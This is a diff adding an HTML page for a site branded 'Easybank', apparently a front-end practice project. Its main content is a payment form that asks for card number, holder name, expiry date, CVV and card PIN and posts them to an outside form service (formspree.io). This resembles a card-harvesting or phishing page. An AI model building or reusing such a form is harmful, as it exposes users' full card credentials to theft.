@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=, initial-scale=1.0">
+    <link rel="shortcut icon" href="favicon-32x32.png" type="image/x-icon">
+    <title>Easybank landing page</title>
+    <link rel="stylesheet" href="../shared.css">
+    <link rel="stylesheet" href="main.css">
+    <script src="main.js"></script>
+    
+</head>
+<body>
+    <header class="main-header">
+        <div class="main-header__brand">
+            <img src="logo.svg" alt="easybank - Your favorite banking">
+        </div>
+        <div id="myModal" class="modal">
+            <nav class="main-nav modal-content">                    
+                <span class="close"><img src="icon-close.svg" alt=""></span>
+                <ul class="main-nav__items">
+                    <li class="main-nav__item">
+                        <a href="../home/index.html">Home</a>
+                    </li>
+                    <li class="main-nav__item">
+                        <a href="../about/index.html">About</a>
+                    </li>
+                    <li class="main-nav__item">
+                        <a href="../contact/index.html">Contact</a>
+                    </li>
+                    <li class="main-nav__item">
+                        <a href="../blog/index.html">Blog</a>
+                    </li>
+                    <li class="main-nav__item">
+                        <a href="../careers/index.html">Careers</a>
+                    </li>
+                    <li class="main-nav__item">
+                        <a href="index.html">Payment</a>
+                    </li>
+                    <li class="main-nav__item main-nav__item--cta">
+                        <a href="index.html">Request link</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <div><button id="myBtn"><img src="../icon-hamburger.svg" alt=""></button></div>
+    <div class="payment--form__div">
+        <h3>Add your payment details</h3>
+        <form class="payment--form" id="payment" action="https://formspree.io/f/xbjqaevp" method="POST">
+            <p class="card" for="card--number">Card number:</p>
+            <input id="card--numb" type="text" name="card" placeholder="Please enter your card number" required>
+
+            <p class="holders--name">Card holders name:</p>
+            <input id="holders--name" type="text" name="holders--name" placeholder="Please enter card holders name" required>
+
+            <p class="expiry" for="expiry--date">Expiry date:</p>
+            <span id="expiry--date"><input class="month" type="text" name="mm" placeholder="MM" required> / <input class="year" type="text" name="yy" placeholder="YY" required></span>
+
+            <p class="cvv" for="cvv">CVV:</p>
+            <input id="cvv" type="text" name="cvv" placeholder="Please enter your cvv" required>
+            
+            <p class="pin" for="pin">Pin:</p>
+            <input id="pin" type="text" name="pin" placeholder="Please enter your card pin" required>
+            <button id="submit" type="submit">Confirm</button>
+        </form>
+    </div>
+    <script src="../main.js"></script>
+    <footer class="main-footer">
+        <div class="footer--contact__links">
+            <a href="index.html" class="header--brand__footer">
+                <img src="logo.svg" alt="easybank - Your favorite bank">
+            </a>
+            <div class="fimg">
+                <a href="https://facebook.com/stella.rashid11" target="_blank"><img src="../icon-facebook.svg" alt="Facebook" width="20" height="20"></a>
+                <a href="https://twitter.com/RoseSopuruchi" target="_blank"><img src="../icon-twitter.svg" alt="Twitter" width="20" height="20"></a>
+                <a href="#" target="_blank"><img src="../icon-pinterest.svg" alt="WhatsApp" width="20" height="20"></a>
+                <a href="https://wa.me/2349052030195" target="_blank"><img src="https://res.cloudinary.com/ros4eva/image/upload/v1566984727/whatsapp_rw2sxh.png" alt="WhatsApp" width="20" height="20"></a>
+                <a href="#" target="_blank"><img src="../icon-instagram.svg" alt="WhatsApp" width="20" height="20"></a>
+            </div>
+        </div>
+        <div class="navigations">
+            <nav class="main--nav1">
+                <ul class="main-footer__links">
+                    <li class="main-footer__link">
+                        <a href="#">About Us</a>
+                    </li>
+                    <li class="main-footer__link">
+                        <a href="#">Contact</a>
+                    </li>
+                    <li class="main-footer__link">
+                        <a href="#">Blog</a>
+                    </li>
+                </ul>
+            </nav>
+            <nav>
+                <ul class="main-footer__links">
+                    <li class="main-footer__link">
+                        <a href="#">Careers</a>
+                    </li>
+                    <li class="main-footer__link">
+                        <a href="#">Support</a>
+                    </li>
+                    <li class="main-footer__link">
+                        <a href="#">Privacy Policy</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+        <div class="request--links">
+            <nav class="frequest__link">
+                <a class="request--link " href="#">Request Invite</a>
+                <p>© Easybank. All Rights Reserved</p>
+            </nav>
+        </div>
+    </footer>
+</body>
+</html>
